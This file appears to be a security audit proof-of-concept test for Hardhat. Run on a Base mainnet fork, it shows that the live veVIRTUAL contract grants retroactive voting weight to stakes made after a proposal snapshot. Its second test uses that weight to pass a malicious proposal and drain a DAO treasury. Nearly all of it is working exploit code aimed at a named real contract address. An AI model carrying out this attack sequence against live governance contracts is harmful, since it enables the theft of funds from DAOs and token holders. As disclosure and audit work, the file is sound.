/*
 * FORK PoC — verifies the snapshot-bypass against the REAL deployed contracts on Base mainnet.
 * Run: FORK_ENABLED=true FORK_RPC_URL=https://mainnet.base.org \
 *      PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
 *      npx hardhat test test/audit/governanceSnapshotBypass.fork.test.js
 * (sideline contracts/tba first so the project compiles — see report.)
 */
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time, impersonateAccount, setBalance, stopImpersonatingAccount } =
  require("@nomicfoundation/hardhat-network-helpers");

const VE = "0x60a203ddcDE45fbfb325bdeEA93824B5726b4dF8";      // LIVE vulnerable lock-based veVIRTUAL
const VIRTUAL = "0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b"; // VIRTUAL token on Base
const WHALE = VE; // veVirtual custodies ~22M locked VIRTUAL; impersonate to fund actors (does NOT affect balanceOfAt, which reads locks[])

const veAbi = [
  "function stake(uint256 amount, uint8 numWeeks, bool autoRenew) external",
  "function balanceOfAt(address,uint256) view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
  "function numPositions(address) view returns (uint256)",
  "function maxWeeks() view returns (uint8)",
  "function locks(address,uint256) view returns (uint256 amount,uint256 start,uint256 end,uint8 numWeeks,bool autoRenew,uint256 id)",
];
const erc20 = [
  "function transfer(address,uint256) returns (bool)",
  "function approve(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
];
const E = ethers.parseEther;

async function fundFromWhale(virtual, to, amount) {
  await setBalance(WHALE, E("10"));
  await impersonateAccount(WHALE);
  const whale = await ethers.getSigner(WHALE);
  await virtual.connect(whale).transfer(to, amount);
  await stopImpersonatingAccount(WHALE);
}

describe("FORK (Base mainnet): live veVIRTUAL balanceOfAt is non-historical", function () {
  before(async function () {
    // A forked Hardhat reports chainId 31337; verify the fork by checking the REAL veVIRTUAL has bytecode.
    const code = await ethers.provider.getCode(VE);
    if (code === "0x" || code.length <= 2) {
      throw new Error(`Not forking Base mainnet — no code at veVIRTUAL ${VE}. Set FORK_ENABLED=true FORK_RPC_URL=https://mainnet.base.org`);
    }
  });

  it("Part A — REAL deployed veVirtual returns full RETROACTIVE weight for a post-snapshot autoRenew stake", async function () {
    const [attacker] = await ethers.getSigners();
    const ve = new ethers.Contract(VE, veAbi, attacker);
    const virtual = new ethers.Contract(VIRTUAL, erc20, attacker);

    const maxWeeks = await ve.maxWeeks();
    const locked = await virtual.balanceOf(VE);
    console.log("  live veVIRTUAL:", VE, "| maxWeeks:", maxWeeks.toString(), "| VIRTUAL locked:", ethers.formatEther(locked));
    expect(Number(maxWeeks)).to.be.greaterThan(0); // sanity: real contract

    const STAKE = E("1000");
    await fundFromWhale(virtual, attacker.address, STAKE);

    // snapshot T = now, BEFORE attacker holds any lock
    const T = await time.latest();
    expect(await ve.numPositions(attacker.address)).to.equal(0n);
    const wBefore = await ve.balanceOfAt(attacker.address, T);
    expect(wBefore).to.equal(0n); // correct historical answer = 0

    // move forward so the new lock is created strictly AFTER the snapshot
    await time.increase(3600);

    // attacker stakes autoRenew AFTER the snapshot
    await virtual.connect(attacker).approve(VE, STAKE);
    await ve.connect(attacker).stake(STAKE, maxWeeks, true);
    const lock = await ve.locks(attacker.address, 0);
    expect(lock.start).to.be.greaterThan(T); // lock created after the snapshot

    // THE BUG on the LIVE contract: the SAME historical query now returns full weight
    const wAfter = await ve.balanceOfAt(attacker.address, T);
    expect(wAfter).to.equal(STAKE); // retroactive — correct answer is still 0

    console.log("  snapshot T:", T, "| lock.start:", lock.start.toString(), "(> T)");
    console.log("  balanceOfAt(attacker, T):", ethers.formatEther(wBefore), "before stake ->", ethers.formatEther(wAfter), "after  ❌ RETROACTIVE");
  });

  it("Part B — DAOV2 (repo code) wired to the LIVE veVIRTUAL → full drain of real VIRTUAL", async function () {
    const [deployer, proposer, honest, attacker] = await ethers.getSigners();
    const ve = new ethers.Contract(VE, veAbi, deployer);
    const virtual = new ethers.Contract(VIRTUAL, erc20, deployer);
    const maxWeeks = await ve.maxWeeks();

    // Deploy the Governor exactly as the repo would, pointed at the LIVE veVIRTUAL token.
    const dao = await ethers.deployContract("VirtualProtocolDAOV2", [VE, 60, 3600, 0, 5000, deployer.address]);

    const TREASURY = E("500000");
    await fundFromWhale(virtual, dao.target, TREASURY);
    await fundFromWhale(virtual, honest.address, E("400"));
    await fundFromWhale(virtual, attacker.address, E("600"));
    await dao.setTotalSupply(E("1000"), await time.latest()); // quorum = 500 ve

    // honest, pre-committed electorate
    await virtual.connect(honest).approve(VE, ethers.MaxUint256);
    await ve.connect(honest).stake(E("400"), maxWeeks, true);

    // malicious proposal: drain the DAO's real VIRTUAL to the attacker
    const targets = [VIRTUAL], values = [0];
    const calldatas = [virtual.interface.encodeFunctionData("transfer", [attacker.address, TREASURY])];
    const desc = "fork-takeover-001", dh = ethers.id(desc);
    await dao.connect(proposer).propose(targets, values, calldatas, desc);
    const pid = await dao.hashProposal(targets, values, calldatas, dh);
    const snap = await dao.proposalSnapshot(pid);

    await time.increaseTo(BigInt(snap) + 5n);
    expect(await dao.state(pid)).to.equal(1); // Active

    // attacker acquires power AFTER the snapshot
    await virtual.connect(attacker).approve(VE, ethers.MaxUint256);
    await ve.connect(attacker).stake(E("600"), maxWeeks, true);

    await dao.connect(honest).castVote(pid, 0);   // 400 Against (pre-committed)
    await dao.connect(attacker).castVote(pid, 1); // 600 For (retroactive)
    const [against, forVotes] = await dao.proposalVotes(pid);
    expect(against).to.equal(E("400"));
    expect(forVotes).to.equal(E("600"));

    await time.increaseTo(BigInt(await dao.proposalDeadline(pid)) + 5n);
    expect(await dao.state(pid)).to.equal(4); // Succeeded

    const before = await virtual.balanceOf(attacker.address);
    await dao.execute(targets, values, calldatas, dh);
    const after = await virtual.balanceOf(attacker.address);
    expect(after - before).to.equal(TREASURY);
    expect(await virtual.balanceOf(dao.target)).to.equal(0n);

    console.log("  DAOV2 wired to LIVE veVIRTUAL — attacker (0 power at snapshot) drained", ethers.formatEther(after - before), "real VIRTUAL");
  });
});
